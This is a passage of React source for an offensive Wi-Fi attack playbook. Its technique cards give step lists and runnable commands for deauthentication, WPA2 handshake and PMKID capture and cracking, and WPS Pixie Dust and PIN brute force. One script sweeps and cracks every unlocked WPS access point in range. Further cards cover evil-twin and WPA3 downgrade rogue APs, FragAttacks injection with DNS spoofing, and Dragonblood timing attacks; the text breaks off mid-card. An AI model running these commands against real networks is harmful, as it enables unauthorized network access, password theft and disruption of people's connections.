import React, { useState } from 'react';
import TechniqueCard from '../components/TechniqueCard';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'WI-FI RECONNAISSANCE',
    color: 'cyan',
    nodes: [
      { title: 'Network Enumeration', subtitle: 'airodump-ng • signal mapping • SSID', id: 'wifi-recon' },
      { title: 'Probe Request Harvesting', subtitle: 'Client tracking • SSID history', id: 'probe-requests' },
      { title: 'Client Analysis', subtitle: 'Active clients • MAC addresses • signal strength', id: 'client-analysis' },
    ]
  },
  {
    header: 'WPA2 ATTACKS',
    color: 'green',
    nodes: [
      { title: 'Handshake Capture', subtitle: 'Deauth • 4-way capture • PCAP', id: 'wpa2-handshake' },
      { title: 'Offline Cracking', subtitle: 'hashcat • john • wordlists • rules', id: 'wpa2-cracking' },
      { title: 'PMKID Attack', subtitle: 'Fast offline crack • no handshake needed', id: 'pmkid' },
    ]
  },
  {
    header: 'WPS ATTACKS',
    color: 'orange',
    nodes: [
      { title: 'Pixie Dust', subtitle: 'PRNG recovery • WPS parameters • weak RNG', id: 'pixie-dust' },
      { title: 'PIN Brute Force', subtitle: 'Eight-digit PIN • bully • checksum', id: 'wps-pin' },
      { title: 'WPS Cracking', subtitle: 'reaver • pixiewps • onlinewpspin', id: 'wps-crack' },
    ]
  },
  {
    header: 'WPA3 ATTACKS',
    color: 'red',
    nodes: [
      { title: 'SAE Downgrade', subtitle: 'Transition mode stripping • WPA3→WPA2 • handshake capture', id: 'wpa3-downgrade' },
      { title: 'Fragmentation & GCMP Bypass', subtitle: 'A-MSDU flag injection • mixed-key attack • cache poisoning', id: 'wpa3-fragment' },
      { title: 'Dragonblood', subtitle: 'SAE timing oracle • cache side-channel • anti-clogging DoS', id: 'dragonblood' },
    ]
  },
  {
    header: 'WPA ENTERPRISE (802.1X)',
    color: 'purple',
    nodes: [
      { title: 'Rogue AP Attack', subtitle: 'hostapd-wpe • EAP credential capture', id: 'rogue-ap' },
      { title: 'EAP Relay', subtitle: 'Relay auth between AP and server', id: 'eap-relay' },
      { title: 'RADIUS Exploitation', subtitle: 'Dictionary attack • CoA injection', id: 'radius' },
    ]
  },
  {
    header: 'ROGUE AP & MITM',
    color: 'pink',
    nodes: [
      { title: 'Evil Twin Setup', subtitle: 'Hostapd • SSID cloning • BSSID spoofing', id: 'evil-twin' },
      { title: 'Traffic Interception', subtitle: 'Tcpdump • tshark • packet sniffing', id: 'interception' },
      { title: 'SSL/TLS Stripping', subtitle: 'sslstrip • mitmproxy • credential theft', id: 'ssl-strip' },
    ]
  },
  {
    header: 'POST-WIFI ACCESS',
    color: 'yellow',
    nodes: [
      { title: 'Internal Reconnaissance', subtitle: 'arp-scan • nmap • service enumeration', id: 'internal-recon' },
      { title: 'Network Pivoting', subtitle: 'Lateral movement • internal services • pivots', id: 'wifi-pivot' },
      { title: 'Persistence', subtitle: 'Wi-Fi backdoors • AP hijacking', id: 'wifi-persistence' },
    ]
  },
];

const techniques = [
  {
    id: 'wifi-recon',
    title: 'Wi-Fi Reconnaissance — Network Enumeration',
    subtitle: 'Enumerate Wi-Fi networks, signal strength, clients, and SSID information',
    tags: ['airodump-ng', 'reconnaissance', 'signal mapping', 'network enumeration', 'passive'],
    accentColor: 'cyan',
    overview: 'Passive wireless reconnaissance uses a monitor-mode adapter to capture all 802.11 beacon frames in range without associating with any AP. This reveals SSID, BSSID, channel, encryption type, and connected clients — the foundation for every subsequent attack. No frames are transmitted during this phase, making it undetectable by the target.',
    steps: [
      'Put adapter into monitor mode: airmon-ng check kill && airmon-ng start wlan0',
      'Run airodump-ng on all channels to build a target list: airodump-ng wlan0mon',
      'Identify target AP — note BSSID, channel (CH), and encryption (ENC/AUTH columns)',
      'Lock to target channel and write capture file: airodump-ng -c <CH> --bssid <BSSID> -w recon_output wlan0mon',
      'Record all associated client MACs from the lower section of the airodump-ng output',
      'Run kismet in parallel for passive GPS-tagged logging and more granular 802.11 frame detail',
    ],
    commands: [
      {
        title: 'Wi-Fi network enumeration',
        code: `# Kill interfering processes and enable monitor mode
airmon-ng check kill
airmon-ng start wlan0
# Creates: wlan0mon

# Passive scan across all channels
airodump-ng wlan0mon
# Columns: BSSID | PWR | Beacons | #Data | CH | MB | ENC | CIPHER | AUTH | ESSID

# Lock to target AP and save capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w recon_output wlan0mon
# Files: recon_output-01.cap, recon_output-01.csv, recon_output-01.kismet.csv

# Parse BSSID/SSID pairs from CSV
awk -F',' 'NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {print $1, $14}' recon_output-01.csv | sort -u

# Kismet — passive logging with 802.11 frame dissection
kismet -c wlan0mon
# Saves .kismet and .pcapng logs — view via kismet web UI at http://localhost:2501`
      }
    ]
  },
  {
    id: 'probe-requests',
    title: 'Probe Request Harvesting & Client Attacks',
    subtitle: 'Capture probe requests to identify SSIDs clients search for and perform client-side attacks',
    tags: ['probe requests', 'SSID history', 'clientless', 'beacon flood', 'mdk4'],
    accentColor: 'cyan',
    overview: 'When a wireless client is not associated to an AP, it continuously broadcasts probe request frames asking "Is <SSID> here?" for every network in its preferred network list (PNL). An attacker in monitor mode can harvest these SSIDs without transmitting anything. Harvested SSIDs can be used to stand up a rogue AP that clients auto-connect to, or to perform a beacon flood to saturate the RF environment.',
    steps: [
      'Put adapter into monitor mode: airmon-ng start wlan0',
      'Start tshark in monitor mode filtering for probe-request frames to harvest client SSIDs',
      'Parse unique SSIDs from output and write to ssid_list.txt',
      'Stand up a rogue AP for a harvested SSID using hostapd so clients auto-associate',
      'Optionally flood the RF environment with beacons for all harvested SSIDs using mdk4 to force client disassociation from real APs',
      'Capture resulting handshakes or perform MITM once clients associate to the rogue AP',
    ],
    commands: [
      {
        title: 'Probe request capture and SSID harvesting',
        code: `# Capture probe requests and extract unique SSIDs
tshark -i wlan0mon -f "type mgt subtype probe-req" \
  -Y "wlan.ssid && wlan.ssid != \"\"" \
  -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | sort -u | tee harvested_ssids.txt

# Alternative via airodump-ng CSV — probe column is last field per client entry
airodump-ng wlan0mon --output-format csv -w probes
awk -F',' 'NR>5 && NF>6 {print $NF}' probes-01.csv | sort -u >> harvested_ssids.txt

# Create hostapd config for a target SSID (open, no password — client auto-connects)
cat > rogue_open.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=Starbucks
channel=6
hw_mode=g
EOF
hostapd rogue_open.conf &

# Beacon flood — force clients off real APs with beacon saturation
mdk4 wlan0mon b -f harvested_ssids.txt -a -s 1000
# -b = beacon flood, -f = SSID file, -a = use random MACs, -s = speed (frames/sec)

# Capture handshakes from clients that roam to rogue AP
airodump-ng -c 6 --bssid <ROGUE_BSSID> -w rogue_handshakes wlan0mon`
      }
    ]
  },
  {
    id: 'client-analysis',
    title: 'Client Analysis — Active Device Tracking',
    subtitle: 'Identify connected clients, their MAC addresses, and signal characteristics',
    tags: ['clients', 'MAC address', 'signal strength', 'device identification', 'airodump-ng'],
    accentColor: 'cyan',
    overview: 'Understanding which clients are connected to a target AP — and how close they are — directly informs attack prioritisation. High-signal clients (-30 to -50 dBm) are physically near the attacker and will have better deauth and handshake capture success rates. OUI lookups on MAC prefixes reveal device types, helping identify high-value targets such as corporate laptops vs. personal phones.',
    steps: [
      'Run airodump-ng locked to target BSSID and channel to show only associated clients',
      'Read client MAC addresses and PWR (signal strength in dBm) from the lower client table',
      'Prioritise clients with PWR above -60 dBm — these are close enough for reliable frame injection',
      'Look up the OUI prefix (first 3 octets) in a vendor database to identify device manufacturer',
      'Note #Frames count — clients with high frame counts are actively communicating and are better handshake targets',
      'Run for an extended period and pipe to CSV to identify persistent vs. transient clients',
    ],
    commands: [
      {
        title: 'Client monitoring and targeting',
        code: `# Lock airodump-ng to target AP and write CSV
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w clients_capture wlan0mon

# Parse client MACs and signal strength from CSV (client rows start below blank line)
awk -F',' 'NR>5 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
  gsub(/ /,"",$1); gsub(/ /,"",$4)
  print "Client:", $1, "| Signal:", $4 "dBm"
}' clients_capture-01.csv

# Filter only strong-signal clients (closer than ~10m)
awk -F',' 'NR>5 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
  gsub(/ /,"",$4)
  if ($4+0 > -60) print $1, $4
}' clients_capture-01.csv

# OUI lookup to identify device vendor (uses IEEE OUI database)
macvendors() { curl -s "https://api.macvendors.com/$1"; }
macvendors AA:BB:CC   # → Apple, Inc. / Dell Inc. / etc.

# Or offline lookup
grep -i "$(echo AA:BB:CC | tr '[:lower:]' '[:upper:]')" /usr/share/ieee-data/oui.txt

# Long-run session to identify persistent clients
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w longrun --output-format csv wlan0mon &
sleep 3600
pkill airodump-ng`
      }
    ]
  },
  {
    id: 'wpa2-handshake',
    title: 'WPA2 Handshake Capture & Deauthentication',
    subtitle: 'Force clients to reauthenticate to capture the WPA2 4-way handshake',
    tags: ['4-way handshake', 'deauth', 'WPA2', 'aireplay-ng', 'capture'],
    accentColor: 'green',
    overview: 'WPA2-PSK authentication is secured by a 4-way EAPOL handshake derived from the PMK (Pre-Shared Key hashed with the SSID). The handshake itself contains enough material to verify password guesses offline. An attacker captures this by sending deauthentication frames (802.11 management frames) to force a connected client to re-associate, triggering a new handshake exchange that is captured passively.',
    steps: [
      'Enable monitor mode and lock airodump-ng to target channel and BSSID, writing to a capture file',
      'Identify at least one connected client MAC from the airodump-ng client table',
      'In a second terminal, send targeted deauth frames to the client: aireplay-ng -0 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon',
      'Watch airodump-ng terminal for "WPA handshake: AA:BB:CC:DD:EE:FF" confirmation in the top-right',
      'If no client is visible, send broadcast deauth to all stations: aireplay-ng -0 5 -a <AP_BSSID> wlan0mon',
      'Stop capture and verify the handshake contains all 4 EAPOL messages with tshark',
      'Convert to hashcat format: hcxpcapngtool -o handshake.hc22000 wpa2_cap-01.cap',
    ],
    commands: [
      {
        title: 'Capturing WPA2 4-way handshake',
        code: `# Terminal 1: Lock capture to target AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_cap wlan0mon
# Watch top-right for: "WPA handshake: AA:BB:CC:DD:EE:FF"

# Terminal 2: Targeted deauth (force specific client to reconnect)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c XX:XX:XX:XX:XX:XX wlan0mon
# -0 = deauth attack, 10 = frame count, -a = AP BSSID, -c = client MAC

# Broadcast deauth (if no specific client known)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake has all 4 EAPOL messages
tshark -r wpa2_cap-01.cap -Y "eapol" -T fields -e frame.number -e eapol.type
# Should show frames for msg 1, 2, 3, 4

# Convert capture to hashcat hc22000 format
hcxpcapngtool -o handshake.hc22000 wpa2_cap-01.cap

# Alternatively convert to legacy hccapx
cap2hccapx wpa2_cap-01.cap handshake.hccapx`
      }
    ]
  },
  {
    id: 'wpa2-cracking',
    title: 'WPA2 Offline Cracking — Hashcat & John',
    subtitle: 'Offline dictionary and brute-force attacks on captured WPA2 handshakes',
    tags: ['hashcat', 'john', 'offline cracking', 'wordlist', 'rules', 'GPU'],
    accentColor: 'green',
    overview: 'Once a WPA2 handshake is captured, the PMK verification can be replicated offline by an attacker. Password candidates are hashed with PBKDF2-SHA1 (4096 iterations) against the captured SSID salt, then validated against the MIC in the handshake. GPU acceleration via hashcat (mode 22000) makes this the primary method of WPA2 password recovery. The speed entirely depends on password complexity — 8-character all-lowercase is crackable in hours on a modern GPU.',
    steps: [
      'Ensure capture is in hc22000 format: hcxpcapngtool -o handshake.hc22000 capture.cap',
      'Run dictionary attack with rockyou.txt: hashcat -m 22000 handshake.hc22000 rockyou.txt',
      'Apply mangling rules to expand wordlist coverage: hashcat -m 22000 handshake.hc22000 rockyou.txt -r rules/best64.rule',
      'Run a mask attack for common patterns (8 chars, lowercase + digits): hashcat -m 22000 handshake.hc22000 -a 3 ?l?l?l?l?d?d?d?d',
      'Run a hybrid attack combining wordlist with appended digits: hashcat -m 22000 handshake.hc22000 -a 6 rockyou.txt ?d?d?d',
      'Check for cracked password: hashcat -m 22000 handshake.hc22000 --show',
    ],
    commands: [
      {
        title: 'WPA2 password cracking',
        code: `# Convert capture to hc22000 (unified PMKID + EAPOL format)
hcxpcapngtool -o handshake.hc22000 wpa2_cap-01.cap

# Dictionary attack
hashcat -m 22000 handshake.hc22000 rockyou.txt

# Dictionary + rules (best64 — most common mangling)
hashcat -m 22000 handshake.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack — 8-char lowercase + 4 digits (e.g. "password1234")
hashcat -m 22000 handshake.hc22000 -a 3 ?l?l?l?l?l?l?l?l
hashcat -m 22000 handshake.hc22000 -a 3 ?u?l?l?l?l?l?d?d

# Hybrid: dictionary word + 3-digit suffix
hashcat -m 22000 handshake.hc22000 -a 6 rockyou.txt ?d?d?d

# Hybrid: 2-digit prefix + dictionary word
hashcat -m 22000 handshake.hc22000 -a 7 ?d?d rockyou.txt

# Show cracked result
hashcat -m 22000 handshake.hc22000 --show
# Output: SSID:BSSID:password

# John the Ripper alternative (legacy hccapx format)
john --format=wpapsk --wordlist=rockyou.txt handshake.hccapx`
      }
    ]
  },
  {
    id: 'pmkid',
    title: 'PMKID Attack — Fast WPA2 Cracking',
    subtitle: 'Capture PMKID without waiting for complete 4-way handshake',
    tags: ['PMKID', 'fast crack', 'no handshake', 'hcxtools', 'hcxdumptool'],
    accentColor: 'green',
    overview: 'The PMKID attack (discovered by Jens Steube in 2018) eliminates the need for a client-AP handshake. The PMKID is a 128-bit value derived from the PMK, AP MAC, and client MAC that is transmitted in the first EAPOL frame of the 4-way handshake. Since it can be requested from the AP at any time (no client deauth required), the attacker only needs to be within range of the AP. The extracted PMKID is then cracked offline the same way as a traditional handshake.',
    steps: [
      'Put adapter into monitor mode: airmon-ng start wlan0',
      'Run hcxdumptool against target BSSID to request EAPOL frames from the AP: hcxdumptool -i wlan0mon --filterlist_ap=<BSSID> --filtermode=2 -o pmkid_cap.pcapng',
      'Wait 30–120 seconds for the AP to respond with an EAPOL frame containing the PMKID',
      'Convert capture to hc22000 format: hcxpcapngtool -z pmkid.hc22000 pmkid_cap.pcapng',
      'Verify PMKID was captured: check for non-empty pmkid.hc22000',
      'Crack with hashcat mode 22000: hashcat -m 22000 pmkid.hc22000 rockyou.txt',
      'Show result: hashcat -m 22000 pmkid.hc22000 --show',
    ],
    commands: [
      {
        title: 'PMKID attack procedure',
        code: `# Create filter file with target BSSID (colon-separated, no spaces)
echo "AA:BB:CC:DD:EE:FF" > target_bssid.txt

# Capture PMKID from AP (no client interaction needed)
hcxdumptool -i wlan0mon \
  --filterlist_ap=target_bssid.txt \
  --filtermode=2 \
  -o pmkid_cap.pcapng \
  --enable_status=1
# Ctrl+C after ~60 seconds

# Convert to hashcat hc22000 format
hcxpcapngtool -z pmkid.hc22000 pmkid_cap.pcapng

# Check how many PMKIDs/handshakes were captured
hcxpcapngtool --info pmkid_cap.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 rockyou.txt

# With rules
hashcat -m 22000 pmkid.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked password
hashcat -m 22000 pmkid.hc22000 --show`
      }
    ]
  },
  {
    id: 'pixie-dust',
    title: 'WPS Pixie Dust Attack',
    subtitle: 'Exploit weak random number generation in WPS to recover the PIN without brute-force',
    tags: ['WPS', 'Pixie Dust', 'PRNG', 'pixiewps', 'reaver'],
    accentColor: 'orange',
    overview: 'WPS Pixie Dust (CVE-2014-9486 and related) exploits routers that use a weak or static PRNG for generating the E-S1 and E-S2 nonces during the WPS exchange. Because these nonces are derived from a predictable seed (often the current Unix time or a constant value), an attacker who captures the WPS M3–M7 exchange can run pixiewps offline to reconstruct the nonces and recover the PIN in seconds — without any brute-force. This affects a large number of Realtek, Ralink, and Broadcom-based router chipsets.',
    steps: [
      'Verify the target AP has WPS enabled and check its lock status: wash -i wlan0mon -C',
      'Identify the channel from airodump-ng output',
      'Run reaver in Pixie Dust mode against the target: reaver -i wlan0mon -b <BSSID> -c <CH> -K -vvv',
      'Reaver captures the WPS M1–M7 exchange and passes E-Hash1, E-Hash2, PKE, PKR, E-Nonce, R-Nonce to pixiewps',
      'pixiewps performs offline PRNG reconstruction — PIN is recovered in seconds if device is vulnerable',
      'Use the recovered PIN to extract the WPA2-PSK: reaver -i wlan0mon -b <BSSID> -c <CH> -p <PIN> -vvv',
    ],
    commands: [
      {
        title: 'Pixie Dust WPS attack',
        code: `# Scan for WPS-enabled APs and check lock status
wash -i wlan0mon -C
# Columns: BSSID | Ch | dBm | WPS | Lck | Vendor | ESSID
# Lck = No → not locked, safe to attack

# Run reaver in Pixie Dust mode (-K flag)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K -vvv
# -K = enable Pixie Dust (passes nonces to pixiewps automatically)
# Output: "WPS PIN: XXXXXXXX" and "WPA PSK: <password>"

# If reaver's -K doesn't work, run manually via bully + pixiewps
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 2>&1 | tee bully_output.txt
# Extract nonces from bully output and pass to pixiewps
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>

# Once PIN is known, extract WPA2 password
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p <RECOVERED_PIN> -vvv
# Outputs: WPA PSK: <plaintext password>

# Check WPS version and Pixie Dust susceptibility
wash -i wlan0mon --verbose -C | grep -E "1.0|Realtek|Ralink"`
      }
    ]
  },
  {
    id: 'wps-pin',
    title: 'WPS PIN Brute Force Attack',
    subtitle: 'Systematically try all 10,000 possible 8-digit WPS PINs',
    tags: ['WPS PIN', 'brute force', 'reaver', 'bully', '10k combinations'],
    accentColor: 'orange',
    overview: 'The WPS PIN is 8 digits, but the last digit is a checksum of the first 7. More critically, the WPS protocol verifies the first and second halves of the PIN independently — this reduces the effective keyspace from 10^7 to 10^4 + 10^3 = 11,000 combinations. Most routers do not implement rate-limiting or lockout on WPS attempts, making a full PIN sweep feasible in a few hours with reaver or bully.',
    steps: [
      'Confirm WPS is enabled and unlocked on the target: wash -i wlan0mon -C',
      'Start a reaver PIN brute-force: reaver -i wlan0mon -b <BSSID> -c <CH> -vvv',
      'Monitor the output — reaver saves state to /etc/reaver/<BSSID>.wpc and can resume',
      'If AP starts locking (Lck = Yes in wash), add a delay: reaver -i wlan0mon -b <BSSID> -d 5 --lock-delay=60',
      'Try bully as an alternative if reaver stalls on certain chipsets',
      'On PIN recovery, reaver automatically negotiates the full WPA2-PSK from the AP',
    ],
    commands: [
      {
        title: 'WPS PIN brute-force attack',
        code: `# Check target WPS status before starting
wash -i wlan0mon -C
# Ensure Lck = No

# Start PIN brute-force with reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vvv
# Tries ~11,000 PINs; each attempt takes ~2-5 seconds on average
# Saves progress to /etc/reaver/AA:BB:CC:DD:EE:FF.wpc

# Resume interrupted session
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vvv
# Reaver auto-loads the .wpc state file

# With rate-limit delay (avoid lockout)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d 5 --lock-delay=60 -vvv
# -d 5 = 5 second delay between attempts
# --lock-delay=60 = wait 60s when AP reports locked

# bully alternative (sometimes handles difficult APs better)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Resume bully session
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3 -s bully_state.conf

# Successful output includes:
# [+] WPS pin: 12345670
# [+] WPA PSK: 'YourPassword'
# [+] AP SSID: 'TargetNetwork'`
      }
    ]
  },
  {
    id: 'wps-crack',
    title: 'WPS Cracking Tools & Workflow',
    subtitle: 'Complete WPS exploitation workflow using reaver, pixiewps, and bully',
    tags: ['reaver', 'pixiewps', 'bully', 'wash', 'WPS workflow'],
    accentColor: 'orange',
    overview: 'A complete WPS engagement chains wash (enumeration), Pixie Dust (fast cryptographic recovery), and PIN brute-force (fallback). The goal is always to recover the WPA2-PSK from the AP\'s WPS credentials database. This workflow covers all three phases in order, with automation for sweeping multiple targets.',
    steps: [
      'Enumerate all WPS-enabled APs in range with wash and write results to a file',
      'For each target, attempt Pixie Dust first with reaver -K (seconds if vulnerable)',
      'For targets not vulnerable to Pixie Dust, start a PIN brute-force with reaver or bully',
      'Monitor all sessions — reaver auto-saves state so multiple targets can run in parallel',
      'Collect recovered PINs and PSKs from reaver output and /etc/reaver/*.wpc database',
      'Connect to target network with recovered PSK: nmcli dev wifi connect "<SSID>" password "<PSK>"',
    ],
    commands: [
      {
        title: 'Complete WPS exploitation workflow',
        code: `# Step 1: Enumerate all WPS-enabled APs
wash -i wlan0mon -C -s 2>&1 | tee wps_targets.txt
# -C = ignore FCS errors, -s = scan mode

# Extract unlocked BSSIDs
grep " No " wps_targets.txt | awk '{print $1, $2}' > unlocked_targets.txt
# Format: BSSID Channel

# Step 2: Try Pixie Dust on each target (30-second timeout per AP)
while IFS=' ' read -r bssid ch; do
  echo "[*] Pixie Dust: $bssid (ch $ch)"
  timeout 30 reaver -i wlan0mon -b "$bssid" -c "$ch" -K -vvv 2>&1 | \
    grep -E "WPS PIN|WPA PSK" | tee -a pixie_results.txt
done < unlocked_targets.txt

# Step 3: PIN brute-force on remaining targets (background, one per target)
while IFS=' ' read -r bssid ch; do
  grep -q "$bssid" pixie_results.txt && continue   # Skip already cracked
  echo "[*] Brute-forcing: $bssid"
  reaver -i wlan0mon -b "$bssid" -c "$ch" -vvv -d 2 \
    > /tmp/reaver_$(echo $bssid | tr -d ':').log 2>&1 &
done < unlocked_targets.txt

# Step 4: Monitor for cracked passwords
grep -h "WPA PSK" /tmp/reaver_*.log 2>/dev/null

# Step 5: Connect to target with recovered PSK
nmcli dev wifi connect "TargetSSID" password "RecoveredPSK"`
      }
    ]
  },
  {
    id: 'wpa3-downgrade',
    title: 'WPA3 SAE Downgrade Attack',
    subtitle: 'Force WPA3 clients and APs to fall back to WPA2 for exploitation',
    tags: ['WPA3', 'SAE', 'downgrade', 'transition mode', 'WPA2 fallback', 'hostapd'],
    accentColor: 'red',
    overview: 'WPA3-Personal uses SAE (Simultaneous Authentication of Equals), a zero-knowledge Diffie-Hellman handshake that eliminates offline dictionary attacks. However, most deployments run WPA3/WPA2 "transition mode" for backward compatibility, advertising both SAE and PSK AKM suites in beacon frames. An attacker can create a rogue AP that advertises only WPA2-PSK, causing clients whose MFP (802.11w) is not mandatory to fall back to WPA2 — exposing a crackable 4-way handshake.',
    steps: [
      'Scan for WPA3/WPA2 transition mode APs: airodump-ng wlan0mon — look for WPA3 WPA2 in the ENC column',
      'Check 802.11w MFP status: tshark on beacon frames — if MFPR bit is 0, clients can fall back',
      'Write a hostapd config advertising only WPA2-PSK on the same SSID/channel with MFP disabled',
      'Start the rogue AP: hostapd downgrade.conf',
      'Deauth target client from the real AP: aireplay-ng -0 5 -a <REAL_AP_BSSID> -c <CLIENT_MAC> wlan0mon',
      'Start airodump-ng on the rogue AP\'s BSSID/channel and wait for the WPA2 handshake to appear',
      'Crack the captured handshake: hcxpcapngtool then hashcat -m 22000',
    ],
    commands: [
      {
        title: 'WPA3 SAE downgrade via transition mode stripping',
        code: `# Step 1: Scan for WPA3 transition mode APs
airodump-ng wlan0mon
# Look for APs showing WPA3 and WPA2 in ENC column

# Step 2: Check 802.11w MFP capability in beacon frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype==8" \
  -T fields -e wlan.ssid -e wlan.rsn.capabilities 2>/dev/null | head -20
# RSN Capabilities byte: bit 6 = MFPC (capable), bit 7 = MFPR (required)
# If MFPR = 0, downgrade is feasible

# Step 3: Write rogue AP config (WPA2-PSK only, MFP disabled)
cat > downgrade.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TargetNetwork
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=0
wpa_passphrase=placeholder123
EOF

# Step 4: Start rogue AP
hostapd downgrade.conf &

# Step 5: Deauth client from real AP
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c XX:XX:XX:XX:XX:XX wlan0mon

# Step 6: Capture WPA2 handshake on rogue AP channel/BSSID
airodump-ng -c 6 --bssid <ROGUE_MAC> -w downgrade_cap wlan0mon
# Wait for "WPA handshake" confirmation

# Step 7: Convert and crack
hcxpcapngtool -o downgrade.hc22000 downgrade_cap-01.cap
hashcat -m 22000 downgrade.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule`
      }
    ]
  },
  {
    id: 'wpa3-fragment',
    title: 'WPA3 Fragmentation & GCMP Bypass Attack',
    subtitle: 'Exploit 802.11 fragment reassembly flaws to inject or decrypt WPA3-protected frames',
    tags: ['WPA3', 'fragmentation', 'GCMP', 'A-MSDU', 'FragAttacks', 'CVE-2020-24586'],
    accentColor: 'red',
    overview: 'FragAttacks (CVE-2020-24586 through CVE-2020-24588, disclosed by Mathy Vanhoef in 2021) are a family of 802.11 implementation flaws affecting virtually all Wi-Fi devices regardless of security protocol. Three distinct bugs exist: (1) A-MSDU flag injection — an attacker can inject a plaintext frame by setting the A-MSDU flag in a fragmented frame header; (2) Mixed-key attack — fragments encrypted under different keys (PTK vs GTK) are reassembled by vulnerable devices; (3) Fragment cache poisoning — stale fragments in the reassembly buffer can be completed by a new legitimate frame. These require physical RF proximity and are exploited using the fragattacks research tool by Vanhoef.',
    steps: [
      'Clone the fragattacks research PoC and install dependencies',
      'Verify the target AP or client accepts injected fragments: python3 fragattack.py wlan0mon --inject-test <BSSID>',
      'Test A-MSDU flag injection — inject a crafted ICMP ping with flipped A-MSDU bit: python3 fragattack.py wlan0mon <BSSID> --amsdu ping',
      'Test mixed-key attack — send frag 1 under PTK, frag 2 under GTK: python3 fragattack.py wlan0mon <BSSID> --mixed-key',
      'Test fragment cache poisoning — pre-fill reassembly buffer then complete with legitimate frame: python3 fragattack.py wlan0mon <BSSID> --cache-poison',
      'Confirm successful injection by observing ICMP reply or injected DNS response reaching target',
      'If injection confirmed, escalate to DNS spoofing or arbitrary plaintext injection within the encrypted session',
    ],
    commands: [
      {
        title: 'FragAttacks — A-MSDU flag injection, mixed-key, and cache poisoning',
        code: `# Clone the official fragattacks research tool (Mathy Vanhoef)
git clone https://github.com/vanhoefm/fragattacks
cd fragattacks/research
pip3 install -r requirements.txt

# Prerequisites: monitor mode + injection-capable adapter (e.g., Alfa AWUS036ACH)
# Driver must support frame injection — test first:
aireplay-ng --test wlan0mon

# Step 1: Test whether target accepts injected fragments
python3 fragattack.py wlan0mon AA:BB:CC:DD:EE:FF --inject-test
# Output: "Injection is working" or "Injected frame was not received"

# Step 2: A-MSDU flag injection — injects plaintext ICMP into encrypted session
python3 fragattack.py wlan0mon AA:BB:CC:DD:EE:FF --amsdu ping
# Flips the A-MSDU bit in a fragmented frame, causing the AP reassembler
# to parse the payload as a sub-frame with attacker-controlled destination

# Step 3: Mixed-key fragment injection (PTK frag 1 + GTK frag 2)
python3 fragattack.py wlan0mon AA:BB:CC:DD:EE:FF --mixed-key
# Vulnerable devices accept fragments from different key contexts
# and reassemble them — results in attacker-controlled plaintext

# Step 4: Fragment cache poisoning
python3 fragattack.py wlan0mon AA:BB:CC:DD:EE:FF --cache-poison
# Pre-fills reassembly buffer with crafted fragment;
# a subsequent legitimate fragment completes the attacker's frame

# Step 5: Inject spoofed DNS response (confirms arbitrary injection)
python3 fragattack.py wlan0mon AA:BB:CC:DD:EE:FF --inject-dns
# If successful: victim's DNS response is replaced — redirect to attacker IP

# Step 6: Manual A-MSDU fragment construction with Scapy (low-level verification)
python3 - << 'EOF'
from scapy.all import *
dot11 = Dot11(addr1="AA:BB:CC:DD:EE:FF", addr2="OWN:MA:CA:DD:RE:SS", addr3="AA:BB:CC:DD:EE:FF")
dot11.FCfield |= 0x04   # More Fragments flag
dot11.SC = (0 << 4) | 0  # Seq 0, Frag 0
pkt = RadioTap() / dot11 / LLC() / SNAP() / IP() / ICMP()
sendp(pkt, iface="wlan0mon", count=1)
EOF`
      }
    ]
  },
  {
    id: 'dragonblood',
    title: 'Dragonblood — SAE Side-Channel & DoS Attacks',
    subtitle: 'Timing and cache side-channel attacks against WPA3 SAE to recover passwords or exhaust AP resources',
    tags: ['Dragonblood', 'SAE', 'timing side-channel', 'dragonslayer', 'ECC', 'anti-clogging DoS', 'CVE-2019-9494'],
    accentColor: 'red',
    overview: 'Dragonblood (CVE-2019-9494, CVE-2019-9496, disclosed by Vanhoef & Ronen) is a family of attacks against WPA3-Personal SAE. The hunting-and-pecking PWE derivation algorithm performs a variable number of iterations that depend on the password and MAC address combination, creating a measurable timing side-channel (~1µs per iteration). An attacker can send forged SAE Commit frames and measure AP response latency to statistically narrow the password search space. A separate denial-of-service vector exploits the SAE anti-clogging mechanism: forged Commit floods from spoofed MACs force the AP to generate and validate tokens, exhausting CPU resources. Practical exploitation uses the dragonslayer PoC tool by Mathy Vanhoef.',
    steps: [
      'Clone dragonslayer and install dependencies: pip3 install scapy',
      'Identify whether the target runs an unpatched hostapd version (< 2.10 without constant-time ECC patch): hostapd -v',
      'Run the timing attack — send SAE Commit frames and collect response latency samples: python3 dragonslayer.py wlan0mon <BSSID> --timing',
